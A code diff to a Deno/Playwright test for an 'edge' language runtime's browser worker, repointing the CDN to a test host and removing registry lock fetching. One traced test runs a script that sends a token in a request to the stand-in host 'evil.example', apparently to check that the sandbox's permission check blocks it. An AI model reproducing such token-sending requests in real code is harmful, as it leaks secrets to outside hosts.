@@ -3,13 +3,11 @@ import { chromium } from "npm:playwright@latest";
 import { readFileSync } from "node:fs";
 import { Buffer } from "node:buffer";
 
-// One CDN host serves every family under a path prefix (/std, /js).
-const CDN_HOST = "cdn.edgelang.dev";
+// a host no network answers that the page loads the staged tree from
+const CDN_HOST = "edge.test";
 // The staged CDN this run tests, served on loopback from cdn/ in CI and locally alike.
 const BASE = Deno.env.get("EDGE_CDN_BASE")?.replace(/\/$/, "");
 if (!BASE) throw new Error("set EDGE_CDN_BASE (make serve)");
-// The registry the lock is read from, the real one unless a run moves it.
-const SITE = (Deno.env.get("EDGE_SITE_BASE") ?? "https://edgelang.dev").replace(/\/$/, "");
 
 const REPO = new URL("../../", import.meta.url).pathname; // the repo root
 const cases = JSON.parse(readFileSync(new URL("./js.json", import.meta.url)));
@@ -24,33 +22,11 @@ const TYPES = {
     ".mini": "text/plain", ".json": "application/json",
 };
 
-/* The official origin answers from BASE, decoded bytes and the CDN's own headers, CORS included. */
+/* The page's host answers from BASE, decoded bytes and the CDN's own headers, CORS included. */
 async function cdn(route, url) {
-    // A staged CDN carries only this build, registry packages stay on the real one.
-    const from = url.pathname.startsWith("/pkg/") ? url.origin : BASE;
-    const res = await fetch(from + url.pathname + url.search);
+    const res = await fetch(BASE + url.pathname + url.search);
     const headers = Object.fromEntries([...res.headers].filter(([k]) => k !== "content-encoding" && k !== "content-length"));
     return route.fulfill({ status: res.status, headers, body: Buffer.from(await res.arrayBuffer()) });
-}
-
-// The release in production still answers at the old address, so the second entry goes once it ships the rename.
-const RESOLVERS = ["/api/resolve/package", "/api/packages"];
-
-/* What `edge lock` would write beside app/edge.json, asked with lock=1 so nothing counts. */
-async function lockOf(imports) {
-    const lock = {};
-    for (const [name, version] of Object.entries(imports)) {
-        if (!/^\d+\.\d+\.\d+$/.test(version)) continue;
-        let res;
-        for (const at of RESOLVERS) {
-            res = await fetch(`${SITE}${at}/${name}?v=${version}&lock=1`);
-            if (res.ok) break;
-        }
-        if (!res.ok) throw new Error(`the registry has no ${name} ${version}, it answered ${res.status}`);
-        const { url, digest } = await res.json();
-        lock[name] = { version, url, digest: `sha256-${digest}` };
-    }
-    return lock;
 }
 
 /* a minimal plugin module built by hand whose `boom` traps and `__edge_abi_version` reports `abi` */
@@ -84,7 +60,6 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
     page.on("console", (m) => { if (m.type() === "error") errors.push(m.text()); });
     const requested = [];
     page.on("request", (q) => requested.push(q.url()));
-    const lock = JSON.stringify(await lockOf(PKG.imports));
 
     const strays = new Set(); // requests to any host but the CDN and the page fixtures, each fails the test
     await page.route("**/*", (r) => {
@@ -96,7 +71,6 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
         }
         if (u.pathname.endsWith("/app/trap.wasm")) return r.fulfill({ contentType: "application/wasm", body: pdkModule(1) });
         if (u.pathname.endsWith("/app/abi2.wasm")) return r.fulfill({ contentType: "application/wasm", body: pdkModule(2) });
-        if (u.pathname.endsWith("/app/edge.lock")) return r.fulfill({ contentType: "application/json", body: lock });
         const ext = u.pathname.slice(u.pathname.lastIndexOf("."));
         try { return r.fulfill({ contentType: TYPES[ext] ?? "application/octet-stream", body: readFileSync(REPO + u.pathname.slice(1)) }); }
         catch { return r.fulfill({ status: 404 }); }
@@ -116,8 +90,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
 
         const reqd = (frag) => requested.some((u) => u.includes(frag));
 
-        // TODO remove the package publication path and every case marked todo
-        for (const c of cases.filter((c) => !c.todo)) {
+        for (const c of cases) {
             errors.length = 0;
             const got = await page.evaluate(async (src) => {
                 const lines = [];
@@ -229,7 +202,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
         // A cap the embedder declares reaches the engine, the sandbox default finishes this loop.
         const capped = await page.evaluate(async (host) => {
             const { createWorker } = await import(host);
-            const worker = await createWorker({ wasmUrl: "https://cdn.edgelang.dev/edge.wasm", limits: { ops: 1000 } });
+            const worker = await createWorker({ wasmUrl: "https://edge.test/edge.wasm", limits: { ops: 1000 } });
             const { out } = await worker.run("n = 0\nfor i in range(100000):\n    n = n + 1\nprint(n)");
             worker.dispose();
             return out;
@@ -239,7 +212,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
         // a traced run reports what it reached and a url without its query
         const trace = await page.evaluate(async (host) => {
             const { createWorker } = await import(host);
-            const worker = await createWorker({ wasmUrl: "https://cdn.edgelang.dev/edge.wasm", trace: true, permissions: { main: ["net"] } });
+            const worker = await createWorker({ wasmUrl: "https://edge.test/edge.wasm", trace: true, permissions: { main: ["net"] } });
             const events = [];
             worker.onTrace((event) => events.push(event));
             await worker.run("import net\nprint('read it')\ntry:\n    net.request('GET', 'https://evil.example/x?token=t-456', {}, nil)\nexcept PermissionError as e:\n    pass\n");
